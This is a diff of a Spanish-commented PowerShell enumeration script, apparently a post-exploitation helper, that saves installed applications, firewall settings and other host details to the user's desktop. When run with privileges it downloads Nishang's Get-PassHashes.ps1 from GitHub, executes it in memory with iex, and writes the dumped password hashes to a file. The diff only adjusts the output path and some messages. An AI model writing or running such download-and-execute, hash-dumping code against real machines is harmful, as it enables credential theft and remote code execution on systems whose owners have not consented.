@@ -13,7 +13,7 @@ function Info-Pc
 
    
 
-    $ruta="c:\users\windows\\Desktop\"
+    $ruta="c:\users\$env:UserName\Desktop\"
     #Archivo 1
     Get-WmiObject -Class Win32_Product > ($ruta+"aplicaciones.txt")
      #Archivo 2
@@ -37,10 +37,13 @@ netsh advfirewall show currentprofile  > ($ruta+"firewall.txt")
 # Archivo 6
  if ($privilegiado -eq "si" -and $SAM)
     {
-    echo "Estas usando en entorno privilegiado"
+    echo "Si Estas usando en entorno privilegiado se volcaran los hashes"
      iex (New-Object net.webclient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1')
     sleep 3
     Get-PassHashes > ($ruta+"Hashs.txt")
     } 
+    
+    echo "Tienes Los archivos en el escritorio del usuario actual"
+    
 
 }
